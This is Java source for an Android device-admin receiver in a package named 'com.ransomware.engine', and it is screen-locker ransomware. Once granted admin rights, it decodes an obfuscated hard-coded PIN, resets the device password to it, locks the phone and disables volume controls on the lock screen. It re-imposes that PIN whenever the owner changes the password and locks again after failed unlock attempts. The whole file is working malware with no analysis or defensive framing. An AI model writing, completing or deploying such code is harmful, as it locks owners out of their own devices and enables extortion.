package com.ransomware.engine;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;

public class AdminReceiver extends DeviceAdminReceiver {
    private static final String ENCRYPTED_PIN = "YQRSbWNmbw==";
    private static final String XOR_KEY = "XyZ2025";

    private String decryptPin() {
        try {
            byte[] decoded = android.util.Base64.decode(ENCRYPTED_PIN, android.util.Base64.DEFAULT);
            String encodedString = new String(decoded, "UTF-8");
            StringBuilder result = new StringBuilder();
            for (int i = 0; i < encodedString.length(); i++) {
                char c = encodedString.charAt(i);
                char keyChar = XOR_KEY.charAt(i % XOR_KEY.length());
                result.append((char)(c ^ keyChar));
            }
            return result.toString();
        } catch (Exception e) {
            return "944721";
        }
    }

    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(context, AdminReceiver.class);
            if (dpm.isAdminActive(adminComponent)) {
                dpm.resetPassword(decryptPin(), DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
                dpm.lockNow();
                dpm.setKeyguardDisabledFeatures(adminComponent,
                        DevicePolicyManager.KEYGUARD_DISABLE_VOLUME_CONTROLS);
            }
        } catch (Exception e) { }
    }

    @Override
    public void onPasswordChanged(Context context, Intent intent) {
        super.onPasswordChanged(context, intent);
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(context, AdminReceiver.class);
            if (dpm.isAdminActive(adminComponent)) {
                dpm.resetPassword(decryptPin(), DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
            }
        } catch (Exception e) { }
    }

    @Override
    public void onPasswordFailed(Context context, Intent intent) {
        super.onPasswordFailed(context, intent);
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            dpm.lockNow();
        } catch (Exception e) { }
    }
}
